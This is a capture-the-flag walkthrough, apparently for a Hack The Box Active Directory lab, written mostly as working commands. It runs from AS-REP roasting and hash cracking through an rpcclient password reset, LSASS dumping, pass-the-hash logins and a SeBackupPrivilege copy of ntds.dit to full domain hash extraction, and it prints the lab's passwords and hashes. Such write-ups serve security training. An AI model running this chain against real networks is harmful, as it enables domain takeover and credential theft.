@@ -1,0 +1,94 @@
+[*] Domain: blackfield.local
+
+[+] SMB shares are accessible by Guest account without a password. 
+
+[*] //10.10.10.192/profiles$ contains no files, but the directory list is a potential username list. So:
+
+root@parrot# ls -d */ | cut -f1 -d'/' > ../usernames.txt
+
+[-] Nothing in //10.10.10.192/IPC$
+
+[*] Well, we don't see any passwords, but we have Kerberos there and a username list. Let's try to roast it.
+
+(AS-REP) 
+root@parrot# python3 `locate GetNPUsers.py` -no-pass -dc-ip 10.10.10.192 BLACKFIELD/ -usersfile usernames.txt -format john -outputfile as_rep_responses
+
+[*] Tons of usernames got filtered out in process. Valid ones are:
+support
+svc_backup
+audit2020
+
+[+] Got a hash for "support". Invoking JTR:
+root@parrot# john --wordlist=/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt as_rep_responses
+
+[+] Password is #00^BlackKnight. 
+
+[-] Unable to connect via WinRM. Maybe, something changed about SMB shares?
+
+[+] We've got a R/O access to //10.10.10.192/NETLOGON and //10.10.10.192/SYSVOL.
+
+[-] Nothing in //10.10.10.192/NETLOGON
+
+[-] Nothing in //10.10.10.192/SYSVOL.
+
+[*] RPC?
+
+root@parrot# rpcclient -U support -H 10.10.10.192
+Enter WORKGROUP\support's password: rpcclient $>
+
+[+] Ok. Finally. Let's see, what's there:
+
+rpcclient $> enumprivsfound 35 privileges<...>SeMachineAccountPrivilege 		0:6 (0x0:0x6)<...>
+[*] SeMachineAccountPrivilege allows us to create and manage accounts on this machine. Let's do exactly this:
+
+rpcclient $> setuserinfo2 svc_backup 23 '0x1A1A1A1A1A1A1A1A'
+result: NT_STATUS_ACCESS_DENIEDresult was NT_STATUS_ACCESS_DENIED
+rpcclient $> setuserinfo2 audit2020 23 '0x1A1A1A1A1A1A1A1A'
+rpcclient $>
+
+[+] Awesome. audit2020 has password '0x1A1A1A1A1A1A1A1A'. And now we have two options: WinRM or, again, SMB Shares.
+
+root@parrot# evil-winrm -i 10.10.10.192 -u audit2020 -p 0x1A1A1A1A1A1A1A1A
+Error: An error of type WinRM::WinRMAuthorizationError happened, message is WinRM::WinRMAuthorizationError
+
+[-] Who'd have thought, huh?
+
+[+] We've got a R/O access to //10.10.10.192/forensic.
+
+[*] memory_analysis/ has lsass.zip, which contains a dump of Local Security Authority Subsystem Service (LSASS) process. 
+
+root@parrot# pypykatz lsa minidump lsass.DMP > pypykatz.txt
+
+[+] Got NTLM hashes for "svc_backup" and "administrator". Maybe, please?
+
+root@parrot# evil-winrm -i 10.10.10.192 -u administrator -H 7f1e4ff8c6a8e6b6fcae2d9c0572cd62
+Error: An error of type WinRM::WinRMAuthorizationError happened, message is WinRM::WinRMAuthorizationError
+
+[-] Well. I've expected that.
+
+root@parrot# evil-winrm -i 10.10.10.192 -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d
+*Evil-WinRM* PS C:\Users\svc_backup\Documents>
+
+[+] Got user.txt!
+
+*Evil-WinRM* PS C:\Users\svc_backup\Desktop> whoami /privPRIVILEGES INFORMATION----------------------Privilege Name                Description                    State============================= ============================== =======SeMachineAccountPrivilege     Add workstations to domain     EnabledSeBackupPrivilege             Back up files and directories  EnabledSeRestorePrivilege            Restore files and directories  EnabledSeShutdownPrivilege           Shut down the system           EnabledSeChangeNotifyPrivilege       Bypass traverse checking       EnabledSeIncreaseWorkingSetPrivilege Increase a process working set Enabled
+
+[*] SeBackupPrivilege/SeRestorePrivilege allow unrestricted read/write access to every file on the system (https://hackinparis.com/data/slides/2019/talks/HIP2019-Andrea_Pierini-Whoami_Priv_Show_Me_Your_Privileges_And_I_Will_Lead_You_To_System.pdf):
+
+*Evil-WinRM* PS C:\Users\svc_backup\Documents> diskshadow /s .\shadow_script.txt
+*Evil-WinRM* PS C:\Users\svc_backup\Documents> Import-Module .\SeBackupPrivilegeCmdLets.dll
+*Evil-WinRM* PS C:\Users\svc_backup\Documents> Import-Module .\SeBackupPrivilegeUtils.dll
+*Evil-WinRM* PS C:\Users\svc_backup\Documents> Copy-FileSeBackupPrivilege w:\windows\NTDS\ntds.dit c:\Users\svc_backup\Documents\ntds.dit -Overwrite
+*Evil-WinRM* PS C:\Users\svc_backup\Documents> reg save HKLM\SYSTEM c:\Users\svc_backup\Documents\system.hive
+
+[*] Dumping NTLM hashes:
+
+root@parrot# impacket-secretsdump -ntds ntds.dit -system system.hive -hashes lmhash:nthash LOCAL -output nt-hash
+
+[+] Got NTLM hash for "administrator".
+
+root@parrot# evil-winrm -i 10.10.10.192 -u administrator -H 184fb5e5178480be64824d4cd53b99ee
+*Evil-WinRM* PS C:\Users\Administrator\Documents>
+
+[+] Got root.txt!
+
